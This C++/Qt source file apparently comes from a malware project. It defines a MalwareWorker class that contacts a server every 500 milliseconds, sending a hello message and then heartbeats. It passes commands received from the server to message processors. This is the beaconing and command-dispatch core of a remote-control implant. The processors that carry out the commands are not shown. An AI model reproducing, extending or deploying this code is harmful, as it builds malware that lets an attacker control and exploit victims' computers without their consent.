#include <QCoreApplication>

#include "../SharedKernel/Network/Http/httpserveradapter.h"
#include "../Network/Messages/Client/heartbeatmessage.h"
#include "../Network/Messages/Client/hellomessage.h"
#include "../Processors/processorresolver.h"
#include "malwareworker.h"

using namespace network::messages::client;
using namespace network::http;
using namespace processors;
using namespace workers;

namespace workers
{
    MalwareWorker::MalwareWorker()
    {

    }

    void MalwareWorker::doWork()
    {
        processorResolver_ = std::make_unique<ProcessorResolver>();
        serverAdapter_ = std::make_unique<HttpServerAdapter>();
        timer_ = std::make_unique<QTimer>();

        QObject::connect(serverAdapter_.get(), SIGNAL(receive(std::shared_ptr<network::messages::server::ServerMessage>)), this, SLOT(onNewServerMessage(std::shared_ptr<network::messages::server::ServerMessage>)));
        QObject::connect(serverAdapter_.get(), SIGNAL(serverReplied()), this, SLOT(onServerReplied()));

        timer_->setInterval(500);
        connect(timer_.get(), SIGNAL(timeout()), this, SLOT(onTick()));
        timer_->start();
    }

    void MalwareWorker::onTick()
    {
        if(!hasEmittedHello_)
        {
            serverAdapter_->send(HelloMessage());
        }
        else
        {
            serverAdapter_->send(HeartbeatMessage());
        }
    }

    void MalwareWorker::onNewServerMessage(std::shared_ptr<network::messages::server::ServerMessage> message)
    {
        std::shared_ptr<MessageProcessorBase> processor = processorResolver_->resolve(message);
        processor.get()->process(message, *serverAdapter_.get());
    }

    void MalwareWorker::onServerReplied()
    {
        hasEmittedHello_ = true;
    }
}
